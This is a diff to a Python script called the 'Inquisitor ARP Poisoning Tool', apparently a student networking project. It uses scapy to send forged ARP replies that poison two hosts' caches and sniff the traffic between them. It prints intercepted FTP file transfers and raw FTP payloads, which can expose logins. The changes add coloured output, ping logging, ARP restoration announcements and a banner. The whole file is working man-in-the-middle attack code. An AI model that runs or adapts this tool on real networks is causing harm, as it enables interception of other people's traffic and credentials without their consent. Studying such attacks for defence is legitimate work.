@@ -7,7 +7,8 @@ import signal
 import sys
 import threading
 import time
-from scapy.all import ARP, Ether, send, sniff
+from scapy.all import ARP, Ether, send, sniff, IP, ICMP
+from colorama import Fore, Style
 
 SRC_IP = None
 TARGET_IP = None
@@ -16,14 +17,14 @@ TARGET_MAC = None
 DELAY = 2
 INTERFACE = "eth0"
 VERBOSE = False
+VERSION = "v1.0"
 
 def signal_handler(sig, frame):
     global RUNNING
     RUNNING = False
 
-    print("\nCTRL+C detected. Restoring ARP tables...")
+    print (f"\nCTRL+C detected. Restoring ARP tables...")
     restore_arp()
-    RUNNING = False
 
 def is_valid_ip(ip):
     # Regex pour valider une adresse IPv4
@@ -43,14 +44,45 @@ def valid_args(args):
     TARGET_MAC = args.target_mac if is_valid_mac(args.target_mac) else None
     return SRC_IP, SRC_MAC, TARGET_IP,TARGET_MAC
 
+def send_arp_announcement(src_ip, src_mac, iface=INTERFACE):
+
+    arp_announcement = ARP(op=2, psrc=src_ip, hwsrc=src_mac, pdst=src_ip, hwdst="ff:ff:ff:ff:ff:ff")
+    send(arp_announcement, iface=iface, verbose=0)
+
 def packet_parser(packet):
-    if packet.haslayer("TCP") and packet["TCP"].payload:
-            raw_data = packet["TCP"].payload.load.decode(errors='replace')
-            print(f"FTP Traffic from {SRC_IP} to {TARGET_IP}: {raw_data.strip()}")
+    if packet.haslayer(IP):
+        src_ip = packet[IP].src
+        # dst_ip = packet[IP].dst
+        
+        # Déterminez si le paquet provient de la cible ou de la source
+        if src_ip == TARGET_IP:
+            origin = f"{Fore.LIGHTMAGENTA_EX}Target{Style.RESET_ALL}"
+        elif src_ip == SRC_IP:
+            origin = f"{Fore.LIGHTGREEN_EX}Source{Style.RESET_ALL}"
+        else:
+            origin = f"{Fore.LIGHTYELLOW_EX}Unknown{Style.RESET_ALL}"
 
-def sniff_ftp_packets():
+        if packet.haslayer("TCP") and packet["TCP"].payload:
+                raw_data = packet["TCP"].payload.load.decode(errors='replace')
+                if VERBOSE:
+                    print(f"[{origin}]-FTP Traffic {Fore.BLUE}{SRC_IP}{Style.RESET_ALL} -> {Fore.BLUE}{TARGET_IP}{Style.RESET_ALL}: {raw_data.strip()}")
+                else:
+                    if 'STOR' in raw_data:
+                        filename = raw_data.split(maxsplit=2)[1]
+                        print(f"[{origin}]-FTP Trafic : {Fore.YELLOW}{filename}{Style.RESET_ALL} -> Server")
+                    if 'RETR' in raw_data:
+                        filename = raw_data.split(maxsplit=2)[1]
+                        print(f"[{origin}]-FTP Trafic : Server -> {Fore.YELLOW}{filename}{Style.RESET_ALL}") 
+        elif packet.haslayer(ICMP):
+            # Vérifie si le paquet est une requête Echo (type 8) ou une réponse Echo (type 0)
+            if packet[ICMP].type == 8:
+                print(f"Ping {Fore.GREEN}Request{Style.RESET_ALL} from {Fore.YELLOW}{packet[IP].src}{Style.RESET_ALL} to {Fore.YELLOW}{packet[IP].dst}{Style.RESET_ALL}")
+            elif packet[ICMP].type == 0:
+                print(f"Ping {Fore.GREEN}Reply{Style.RESET_ALL} from {Fore.YELLOW}{packet[IP].src}{Style.RESET_ALL} to {Fore.YELLOW}{packet[IP].dst}{Style.RESET_ALL}")
 
-    print(f"Listening for FTP packets in {INTERFACE}...", end=' ')
+def sniff_packets():
+    global RUNNING
+    print(f"Listening for FTP packets in {INTERFACE}...")
     while RUNNING:
         if INTERFACE:
             sniff(prn=packet_parser, timeout=2, store=0, iface=INTERFACE)
@@ -62,13 +94,16 @@ def sniff_ftp_packets():
 def restore_arp():
     packet_target = ARP(op=2, pdst=TARGET_IP, hwdst=TARGET_MAC, psrc=SRC_IP, hwsrc=SRC_MAC)
     send(packet_target, verbose=0)
-    print(f"Restauration de l'ARP pour la cible {TARGET_IP}.")
+    print(f"ARP restoration for Target : {Fore.BLUE}{TARGET_IP}{Style.RESET_ALL}.")
 
     packet_source = ARP(op=2, pdst=SRC_IP, hwdst=SRC_MAC, psrc=TARGET_IP, hwsrc=TARGET_MAC)
     send(packet_source, verbose=0)
-    print(f"Restauration de l'ARP pour la source {SRC_IP}.")
+    print(f"ARP restoration for Source : {Fore.BLUE}{SRC_IP}{Style.RESET_ALL}.")
+    send_arp_announcement(SRC_IP, SRC_MAC, INTERFACE)
+    send_arp_announcement(TARGET_IP, TARGET_MAC, INTERFACE)
 
-def main_loop():
+def poisoning():
+    global RUNNING
     while RUNNING:
         try:
             arp_response_target = ARP(pdst=TARGET_IP, hwdst=TARGET_MAC, psrc=SRC_IP, op='is-at')
@@ -80,10 +115,24 @@ def main_loop():
             print(f"Error in ARP poison thread: {e}")
     
 
+def ecran():
+
+    print ("  _____                   _     _ _             ")
+    print (" |_   _|                 (_)   (_) |            ")
+    print ("   | |  _ __   __ _ _   _ _ ___ _| |_ ___  _ __ ")
+    print ("   | | | '_ \ / _` | | | | / __| | __/ _ \| '__|")
+    print ("  _| |_| | | | (_| | |_| | \__ \ | || (_) | |   ")
+    print (" |_____|_| |_|\__, |\__,_|_|___/_|\__\___/|_|   ")
+    print ("                 | |                            ")
+    print (f"                 |_|       {Fore.GREEN}{VERSION}{Style.RESET_ALL}\n")
+
+
+
 if __name__ == "__main__":
     global RUNNING
     RUNNING = True
     signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
 
     parser = argparse.ArgumentParser(description="Inquisitor ARP Poisoning Tool")
 
@@ -100,11 +149,12 @@ if __name__ == "__main__":
         print("Invalid arguments")
         sys.exit(1)
 
-    thread = threading.Thread(target=main_loop)
+    ecran()
+    thread = threading.Thread(target=poisoning)
     thread.start()
 
     try:
-        sniff_ftp_packets()
+        sniff_packets()
     finally:
         RUNNING = False
         thread.join()   #waiting thread finish
